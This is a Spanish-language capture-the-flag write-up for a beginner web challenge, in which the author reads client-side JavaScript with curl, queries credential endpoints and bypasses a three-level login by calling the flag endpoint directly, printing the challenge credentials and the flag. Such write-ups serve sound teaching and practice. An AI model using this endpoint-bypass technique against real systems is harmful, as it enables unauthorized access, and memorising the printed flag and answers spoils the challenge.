### Reto CTF: Onion Login

**Objetivo:** Obtener la flag tras completar 3 niveles de autenticación en `https://onion.ctf.cert.unlp.edu.ar`.

---

**Pasos Realizados:**

1.  **Análisis Inicial del Sitio:**
    Se descargó el código fuente de la página principal para entender la estructura del reto.
    ```bash
    curl -s https://onion.ctf.cert.unlp.edu.ar > onion_page.html
    ```
    El HTML reveló que la lógica del login estaba manejada por un script en `/static/app.js`.

2.  **Análisis de la Lógica del Cliente (`app.js`):**
    Se descargó el archivo JavaScript para inspeccionar cómo se validaban los credenciales.
    ```bash
    curl -s https://onion.ctf.cert.unlp.edu.ar/static/app.js > app.js
    ```
    Al leer el código, se descubrieron varias cosas interesantes:
    *   Los credenciales no estaban hardcodeados, sino que se obtenían dinámicamente de endpoints: `/get_credentials/1`, `/get_credentials/2`, y `/get_credentials/3`.
    *   Se almacenaban en diferentes lugares del navegador: `localStorage` (Nivel 1), `sessionStorage` (Nivel 2) y `cookies` (Nivel 3).
    *   Existía una función `checkAllComplete()` que llamaba a un endpoint final: `/get_flag`.

3.  **Obtención de Credenciales (Opcional pero instructivo):**
    Siguiendo la lógica descubierta, se consultaron los endpoints de credenciales:
    *   **Nivel 1:** `curl https://onion.ctf.cert.unlp.edu.ar/get_credentials/1` -> `Ash` / `Pikachu123!`
    *   **Nivel 2:** `curl https://onion.ctf.cert.unlp.edu.ar/get_credentials/2` -> `Gary` / `Looser456!!!`
    *   **Nivel 3:** `curl https://onion.ctf.cert.unlp.edu.ar/get_credentials/3` -> `Admin` / `nimdA`

4.  **Obtención de la Flag (Bypass):**
    En lugar de realizar todo el proceso de login nivel por nivel, se llamó directamente al endpoint final descubierto en el código fuente:
    ```bash
    curl -s https://onion.ctf.cert.unlp.edu.ar/get_flag
    ```

    **Respuesta del servidor:**
    ```json
    {
      "flag": "UNLP{B4s1c_5t0rAg3_&_DEV_t00Ls}"
    }
    ```

    **Flag Final:**
    `UNLP{B4s1c_5t0rAg3_&_DEV_t00Ls}`

---